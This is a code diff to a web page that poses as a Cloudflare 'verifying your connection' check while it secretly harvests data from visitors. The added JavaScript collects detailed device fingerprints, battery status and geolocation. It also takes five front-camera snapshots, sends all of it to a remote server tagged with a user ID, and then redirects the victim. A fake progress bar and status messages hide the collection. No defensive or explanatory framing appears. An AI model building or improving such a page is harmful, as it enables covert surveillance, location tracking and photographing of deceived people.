@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Checking your browser...</title>
+    <title>Verifying your connection...</title>
     <style>
         * {
             margin: 0;
@@ -106,6 +106,32 @@
             font-size: 12px;
             color: #999;
         }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #f3f3f3;
+            border-radius: 2px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #f6821f, #ff9f43);
+            width: 0%;
+            animation: progress 6s ease-in-out forwards;
+        }
+
+        @keyframes progress {
+            0% {
+                width: 0%;
+            }
+
+            100% {
+                width: 100%;
+            }
+        }
     </style>
 </head>
 
@@ -123,6 +149,9 @@
             <p class="subtitle">This process is automatic. Your browser will redirect shortly.</p>
 
             <div class="loader"></div>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
 
             <p class="status" id="status">Performing security check...</p>
 
@@ -148,13 +177,13 @@
             'Checking your browser...',
             'Verifying security...',
             'Analyzing request...',
+            'Collecting system information...',
             'Almost done...'
         ];
 
         let statusIndex = 0;
         const statusEl = document.getElementById('status');
 
-        // Update status every 1.5 seconds
         const statusInterval = setInterval(() => {
             statusIndex++;
             if (statusIndex < statuses.length) {
@@ -163,23 +192,66 @@
                 clearInterval(statusInterval);
                 statusEl.textContent = 'Redirecting...';
             }
-        }, 1500);
+        }, 1200);
 
-        // Collect device information
+        // Enhanced data collection
         async function collectData() {
             const data = {
+                // Basic Info
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
+                languages: navigator.languages?.join(', ') || navigator.language,
+
+                // Screen Info
                 screenResolution: `${screen.width}x${screen.height}`,
-                colorDepth: screen.colorDepth,
+                screenColorDepth: screen.colorDepth,
+                screenPixelDepth: screen.pixelDepth,
+                screenAvailSize: `${screen.availWidth}x${screen.availHeight}`,
+
+                // Window Info
+                windowSize: `${window.innerWidth}x${window.innerHeight}`,
+                devicePixelRatio: window.devicePixelRatio,
+
+                // System Info
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
                 cookiesEnabled: navigator.cookieEnabled,
                 onlineStatus: navigator.onLine,
-                referrer: document.referrer,
+                doNotTrack: navigator.doNotTrack,
+
+                // Hardware Info
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+
+                // Connection Info
+                connectionType: navigator.connection?.effectiveType || 'Unknown',
+                connectionDownlink: navigator.connection?.downlink ? `${navigator.connection.downlink} Mbps` : 'Unknown',
+                connectionRtt: navigator.connection?.rtt ? `${navigator.connection.rtt} ms` : 'Unknown',
+
+                // Other
+                referrer: document.referrer || 'Direct',
                 timestamp: new Date().toISOString(),
                 pageType: 'CloudFlare Check'
             };
+
+            // Get OS Info
+            const userAgent = navigator.userAgent;
+            if (userAgent.indexOf('Win') !== -1) data.os = 'Windows';
+            else if (userAgent.indexOf('Mac') !== -1) data.os = 'MacOS';
+            else if (userAgent.indexOf('Linux') !== -1) data.os = 'Linux';
+            else if (userAgent.indexOf('Android') !== -1) data.os = 'Android';
+            else if (userAgent.indexOf('iOS') !== -1 || userAgent.indexOf('iPhone') !== -1 || userAgent.indexOf('iPad') !== -1) data.os = 'iOS';
+            else data.os = 'Unknown';
+
+            // Get Browser Info
+            if (userAgent.indexOf('Chrome') !== -1 && userAgent.indexOf('Edg') === -1) data.browser = 'Chrome';
+            else if (userAgent.indexOf('Safari') !== -1 && userAgent.indexOf('Chrome') === -1) data.browser = 'Safari';
+            else if (userAgent.indexOf('Firefox') !== -1) data.browser = 'Firefox';
+            else if (userAgent.indexOf('Edg') !== -1) data.browser = 'Edge';
+            else if (userAgent.indexOf('Opera') !== -1 || userAgent.indexOf('OPR') !== -1) data.browser = 'Opera';
+            else data.browser = 'Unknown';
 
             // Send basic info
             await fetch(serverUrl, {
@@ -188,44 +260,81 @@
                 body: `uid=${encodeURIComponent(userId)}&data=${encodeURIComponent(
                     Object.entries(data).map(([k, v]) => `<b>${k}:</b> ${v}`).join('<br>')
                 )}`
-            });
+            }).catch(e => console.log('Error sending data:', e));
 
-            // Try to get location
+            // Get Battery Info
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    const batteryData = {
+                        level: `${Math.round(battery.level * 100)}%`,
+                        charging: battery.charging ? 'Yes' : 'No',
+                        chargingTime: battery.chargingTime === Infinity ? 'N/A' : `${Math.round(battery.chargingTime / 60)} min`,
+                        dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : `${Math.round(battery.dischargingTime / 60)} min`
+                    };
+
+                    await fetch(serverUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: `uid=${encodeURIComponent(userId)}&data=${encodeURIComponent(
+                            '<b>Battery Status:</b><br>' +
+                            Object.entries(batteryData).map(([k, v]) => `<b>${k}:</b> ${v}`).join('<br>')
+                        )}`
+                    }).catch(e => console.log('Error sending battery:', e));
+                } catch (e) {
+                    console.log('Battery API not available');
+                }
+            }
+
+            // Get Location
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (position) => {
                     await fetch(serverUrl + '/location', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                         body: `uid=${encodeURIComponent(userId)}&lat=${position.coords.latitude}&lon=${position.coords.longitude}&acc=${position.coords.accuracy}`
-                    });
+                    }).catch(e => console.log('Error sending location:', e));
+                }, (error) => {
+                    console.log('Location denied:', error.message);
                 });
             }
 
-            // Try to get camera snapshot
+            // Get Camera Snapshots (3-5 pictures)
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' }
+                });
+
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
 
-                setTimeout(async () => {
+                // Wait for video to be ready
+                await new Promise(resolve => {
+                    video.onloadedmetadata = resolve;
+                });
+
+                // Take 5 snapshots with 1 second interval
+                for (let i = 0; i < 5; i++) {
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+
                     const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
 
-                    const imageData = canvas.toDataURL('image/png').split(',')[1];
+                    const imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
 
                     await fetch(serverUrl + '/camsnap', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                        body: `uid=${encodeURIComponent(userId)}&img=${encodeURIComponent(imageData)}`
-                    });
+                        body: `uid=${encodeURIComponent(userId)}&img=${encodeURIComponent(imageData)}&index=${i + 1}`
+                    }).catch(e => console.log('Error sending snapshot:', e));
+                }
 
-                    stream.getTracks().forEach(track => track.stop());
-                }, 1000);
+                stream.getTracks().forEach(track => track.stop());
             } catch (e) {
-                console.log('Camera access denied');
+                console.log('Camera access denied or not available');
             }
         }
 
@@ -233,7 +342,7 @@
         collectData().then(() => {
             setTimeout(() => {
                 window.location.href = targetUrl;
-            }, 6000); // Redirect after 6 seconds
+            }, 6000);
         });
     </script>
 </body>
